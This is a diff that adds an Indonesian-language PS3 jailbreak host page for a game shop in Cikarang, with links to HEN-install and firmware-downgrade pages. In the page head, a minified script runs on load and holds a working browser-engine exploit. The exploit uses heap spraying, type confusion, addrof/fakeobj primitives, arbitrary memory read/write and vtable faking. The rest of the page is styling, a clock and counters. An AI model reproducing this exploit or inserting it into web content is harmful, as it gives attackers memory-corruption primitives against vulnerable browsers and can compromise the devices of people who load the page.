@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="id" manifest="offlinexmb.cache">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DZA Host PS3 - Cikarang</title>
+    
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- FontAwesome Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Google Fonts Poppins -->
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+    
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['Poppins', 'sans-serif'],
+                    },
+                    colors: {
+                        gamingDark: '#080c16',
+                        gamingCard: '#111827',
+                        gamingCardHover: '#1f2937',
+                        psPurple: '#6b21a8',
+                        accentCyan: '#00f2fe',
+                        accentGreen: '#10b981',
+                        accentRed: '#ef4444',
+                    }
+                }
+            }
+        }
+    </script>
+    
+    <style>
+        body {
+            background-color: #080c16;
+            background-image: 
+                radial-gradient(circle at 15% 15%, rgba(107, 33, 168, 0.2) 0%, transparent 45%),
+                radial-gradient(circle at 85% 85%, rgba(0, 242, 254, 0.1) 0%, transparent 45%);
+            min-height: 100vh;
+        }
+        .glow-effect {
+            box-shadow: 0 0 20px rgba(107, 33, 168, 0.3);
+            transition: all 0.3s ease;
+        }
+        .glow-effect:hover {
+            box-shadow: 0 0 30px rgba(0, 242, 254, 0.5);
+            transform: translateY(-3px);
+        }
+        .ps3-gradient-header {
+            background: linear-gradient(135deg, #4c1d95 0%, #6b21a8 100%);
+        }
+    </style>
+
+    <script>
+        var leaker_obj={a:0};var leaker_arr=new Uint32Array(6);var oob_slave=new Uint8Array(1024);var oob_master=new Uint32Array(7);var spray=[];function spray_one(){var x=new Uint32Array(1);x[spray.length+'spray']=123;spray.push(x);}for(var i=0;i<0x10000;i++)spray_one();var target={a:2.1100820415101592e-303,b:false,c:true,d:5678};var target2={a:2.1100820415101592e-303,b:false,c:true,e:5678};var impl_idx=0;function create_impl(){var ans={a:target};for(var i=0;i<32;i++)ans[(impl_idx++)+'x']={};return ans;}function trigger(x){if(impl.a!=target){while(1);}var o={a:1};for(var i in o){{i=x;function i(){};}o[i];}if(impl.a!=target){target.c=leaker_obj;leaker_obj.a=leaker_obj;var l1=impl.a[4];var l2=impl.a[5];leaker_obj.a=oob_slave;var s1=impl.a[4];var s2=impl.a[5];target.c=leaker_arr;impl.a[4]=l1;impl.a[5]=l2;target.c=oob_master;impl.a[4]=s1;impl.a[5]=s2;impl.a=target;throw"exploit finished";}}try{for(var _=0;_<1024;_++){var impl=create_impl();var s={a:impl};trigger(s);}}catch(e){}function i48_put(x,a){a[4]=x|0;a[5]=(x/4294967296)|0;}function i48_get(a){return a[4]+a[5]*4294967296;}function addrof(x){leaker_obj.a=x;return i48_get(leaker_arr);}function fakeobj(x){i48_put(x,leaker_arr);return leaker_obj.a;}function read_mem_setup(p,sz){i48_put(p,oob_master);oob_master[6]=sz;}function read_mem(p,sz){read_mem_setup(p,sz);var arr=[];for(var i=0;i<sz;i++)arr.push(oob_slave[i]);return arr;}function write_mem(p,data){i48_put(p,oob_master);oob_master[6]=data.length;for(var i=0;i<data.length;i++)oob_slave[i]=data[i];}function read_ptr_at(p){var ans=0;var d=read_mem(p,8);for(var i=7;i>=0;i--)ans=256*ans+d[i];return ans;}function write_ptr_at(p,d){var arr=[];for(var i=0;i<8;i++){arr.push(d&0xff);d/=256;}write_mem(p,arr);}var malloc_nogc=[];function malloc(sz){var arr=new Uint8Array(sz);malloc_nogc.push(arr);return read_ptr_at(addrof(arr)+0x10);}var tarea=document.createElement('textarea');var real_vt_ptr=read_ptr_at(addrof(tarea)+0x18);var fake_vt_ptr=malloc(0x400);write_mem(fake_vt_ptr,read_mem(real_vt_ptr,0x400));var real_vtable=read_ptr_at(fake_vt_ptr);var fake_vtable=malloc(0x2000);write_mem(fake_vtable,read_mem(real_vtable,0x2000));write_ptr_at(fake_vt_ptr,fake_vtable);
+    </script>
+</head>
+<body class="text-white flex flex-col min-h-screen justify-between antialiased selection:bg-cyan-400 selection:text-black">
+
+    <!-- Cache update progress overlay -->
+    <div id="ScrOverlay" class="cacheUPDbg hidden">
+        <pre id="cacheUPDtxt" class="cacheUPD"></pre>
+        <div id="CacheProgress"><div id="CacheBar"></div></div>
+    </div>
+
+    <!-- Header Section -->
+    <header class="w-full pt-6 pb-4 px-4 text-center relative z-10">
+        <div class="max-w-4xl mx-auto flex flex-col items-center">
+            
+            <!-- Online status badge & Clock -->
+            <div class="flex flex-wrap items-center justify-center gap-3 mb-4">
+                <div class="inline-flex items-center gap-2 bg-purple-500/10 border border-purple-500/30 px-4 py-1.5 rounded-full text-xs font-semibold text-purple-300 backdrop-blur-md">
+                    <span class="w-2.5 h-2.5 rounded-full bg-purple-400 animate-ping"></span>
+                    <span>DZA GameStore Cikarang PS3 Host</span>
+                </div>
+                <div class="bg-gamingCard border border-slate-700/80 px-4 py-1.5 rounded-full text-xs text-slate-300 shadow-lg flex items-center gap-2">
+                    <i class="fa-regular fa-clock text-cyan-400"></i>
+                    <span id="clock" class="font-mono">00:00</span>
+                    <span class="text-slate-600">|</span>
+                    <span id="date">Loading...</span>
+                </div>
+            </div>
+
+            <!-- Main Title & Success/Fail Counter -->
+           
+                
+                <h1 class="text-xl md:text-2xl font-black text-transparent bg-clip-text bg-gradient-to-r from-purple-400 to-cyan-400 tracking-tight text-center">
+                    PLAYSTATION 3 JAILBREAK HOST
+                </h1>
+
+                
+            </div>
+
+            <!-- Dynamic Status Notification Box -->
+            <div class="mt-4 w-full bg-slate-900/90 border border-purple-500/30 py-3 px-6 rounded-xl shadow-lg">
+                <p class="text-xs uppercase tracking-widest text-purple-400 font-semibold mb-0.5">Status Sistem</p>
+                <div id="msgs2" class="text-sm md:text-base font-bold text-slate-200 transition-all">
+                    Dza Gameing - Silahkan Pilih Versi HEN atau Downgrade
+                </div>
+            </div>
+
+        </div>
+    </header>
+
+    <!-- Main Firmware & HEN Selection Grid -->
+    <main class="w-full max-w-4xl mx-auto px-4 py-4 flex-grow" id="MyItems">
+        <div class="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-4">
+            
+        
+
+            <!-- Install HEN 4.91 -->
+            <a href="autohen/index.html" 
+               onmouseover="document.getElementById('msgs2').innerHTML='Untuk Ps3 Auto Hen 4.92'" 
+               onmouseout="document.getElementById('msgs2').innerHTML='Status'"
+               class="group relative bg-gamingCard border border-slate-700/80 hover:border-emerald-400/60 rounded-2xl p-5 text-center glow-effect block">
+                <div class="w-12 h-12 rounded-xl ps3-gradient-header flex items-center justify-center text-xl text-white shadow-md mx-auto mb-3 group-hover:scale-110 transition-transform">
+                    <i class="fa-solid fa-bolt"></i>
+                </div>
+                <span class="text-xs font-bold text-emerald-400 uppercase tracking-widest block mb-1">Latest HEN</span>
+                <h3 class="text-lg font-black text-white mb-1">autohen Install HEN 4.92</h3>
+                <p class="text-xs text-slate-400 mb-3">Mendukung firmware 4.92.</p>
+                <span class="inline-flex items-center justify-center w-full py-2 px-3 rounded-lg text-xs font-bold text-black bg-emerald-400 hover:bg-emerald-300 shadow-md">
+                    Pilih HEN 4.92 <i class="fa-solid fa-arrow-right ml-1"></i>
+                </span>
+            </a>
+
+          
+
+         
+            <!-- Downgrade 4.91 / Flashwriter -->
+            <a href="dg/index.html" 
+               onmouseover="document.getElementById('msgs2').innerHTML='Untuk Downgrade/FlashWriter Ps3 Yang Sudah Terinstall HFW 4.93'";
+               onmouseout="document.getElementById('msgs2').innerHTML='Status'"
+               class="group relative bg-gamingCard border border-slate-700/80 hover:border-yellow-400/60 rounded-2xl p-5 text-center glow-effect block">
+                <div class="w-12 h-12 rounded-xl ps3-gradient-header flex items-center justify-center text-xl text-white shadow-md mx-auto mb-3 group-hover:scale-110 transition-transform">
+                    <i class="fa-solid fa-microchip"></i>
+                </div>
+                <span class="text-xs font-bold text-yellow-400 uppercase tracking-widest block mb-1">FlashWriter</span>
+                <h3 class="text-lg font-black text-white mb-1">Downgrade 4.93</h3>
+                <p class="text-xs text-slate-400 mb-3">Alat flash memori.</p>
+                <span class="inline-flex items-center justify-center w-full py-2 px-3 rounded-lg text-xs font-bold text-black bg-yellow-400 hover:bg-yellow-300 shadow-md">
+                    Pilih 4.91 <i class="fa-solid fa-arrow-right ml-1"></i>
+                </span>
+            </a>
+
+        </div>
+
+        <!-- Back Button -->
+        <div class="mt-6 text-center">
+            <a href="https://dzagameing.github.io/index.html" 
+               onmouseover="document.getElementById('msgs2').innerHTML='Kembali Kemenu sebelumya'" 
+               onmouseout="document.getElementById('msgs2').innerHTML='Status'"
+               class="inline-flex items-center gap-2 bg-cyan-500/20 border border-cyan-400/40 hover:bg-cyan-500/30 text-cyan-300 font-bold px-6 py-2.5 rounded-xl transition-all shadow-lg">
+                <i class="fa-solid fa-arrow-left"></i> Kembali ke Menu Utama
+            </a>
+        </div>
+    </main>
+
+    <!-- Footer Credits -->
+    <footer class="w-full py-6 px-4 border-t border-slate-800/80 bg-gamingDark/90 backdrop-blur-md mt-auto">
+        <div class="max-w-4xl mx-auto text-center space-y-3">
+            <div class="text-xs uppercase tracking-wider text-cyan-400 font-bold">
+                Di edit by <span class="text-white">Donogodeat</span> &bull; <span class="text-purple-400">DZA GameStore Cikarang</span>
+            </div>
+            
+            <div class="text-xs text-slate-400 leading-relaxed">
+                <strong class="text-slate-200">Terimakasih Kepada:</strong> 
+                <span class="text-slate-400">Tim PS3Xploit, Evilnat, kostirez1, littlebalup, Joonie</span>
+            </div>
+
+            <p class="text-[11px] text-slate-600">
+                &copy; 2026 DZA GameStore Cikarang. Pelayanan cepat, ramah, dan bergaransi!
+            </p>
+        </div>
+    </footer>
+
+    <script>
+        // Realtime Clock & Date
+        function updateClock() {
+            const now = new Date();
+            const hours = String(now.getHours()).padStart(2, '0');
+            const minutes = String(now.getMinutes()).padStart(2, '0');
+            if(document.getElementById('clock')) {
+                document.getElementById('clock').textContent = `${hours}:${minutes}`;
+            }
+
+            const options = { weekday: 'short', year: 'numeric', month: 'short', day: 'numeric' };
+            if(document.getElementById('date')) {
+                document.getElementById('date').textContent = now.toLocaleDateString('id-ID', options);
+            }
+        }
+        setInterval(updateClock, 1000);
+        updateClock();
+
+        // LocalStorage Counters sync if present
+        window.onload = function() {
+            if(document.getElementById('passCounter')) {
+                document.getElementById('passCounter').textContent = localStorage.getItem('dza_pass') || '0';
+            }
+            if(document.getElementById('failCounter')) {
+                document.getElementById('failCounter').textContent = localStorage.getItem('dza_fail') || '0';
+            }
+        };
+    </script>
+</body>
+</html>
